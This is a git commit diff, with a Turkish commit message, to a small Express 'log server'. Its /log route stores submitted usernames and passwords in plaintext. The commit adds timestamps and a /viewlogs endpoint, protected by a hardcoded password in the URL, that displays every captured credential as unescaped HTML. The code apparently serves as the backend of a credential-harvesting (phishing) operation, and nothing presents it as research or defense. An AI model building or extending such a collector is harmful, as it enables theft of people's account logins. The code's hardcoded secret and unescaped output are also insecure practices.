80b868acc587143c5c513672344c4710e3c2a1c0
Kutay <kutaycinar12@gmail.com>
2025-07-05 09:11:41 +0300

    Log görüntüleme endpoint'i eklendi

--- server.js
+++ server.js
@@ -7,9 +7,26 @@ app.use(express.json());
 
 app.post("/log", (req, res) => {
   const { username, password } = req.body;
-  const logEntry = `Username: ${username}, Password: ${password}\n`;
+  const timestamp = new Date().toLocaleString();
+  const logEntry = `[${timestamp}] Username: ${username}, Password: ${password}\n`;
   fs.appendFileSync("log.txt", logEntry);
   res.sendStatus(200);
+});
+
+// Log dosyasını görüntülemek için güvenli endpoint
+app.get("/viewlogs/:password", (req, res) => {
+  const secretPassword = "159753"; // Bu şifreyi güvenli bir şifre ile değiştirin
+  
+  if (req.params.password === secretPassword) {
+    try {
+      const logData = fs.readFileSync("log.txt", "utf8");
+      res.send(`<pre>${logData}</pre>`);
+    } catch (error) {
+      res.status(500).send("Log dosyası okunamadı: " + error.message);
+    }
+  } else {
+    res.status(401).send("Yetkisiz erişim!");
+  }
 });
 
 app.listen(PORT, () => console.log(`Log server running on ${PORT}`));
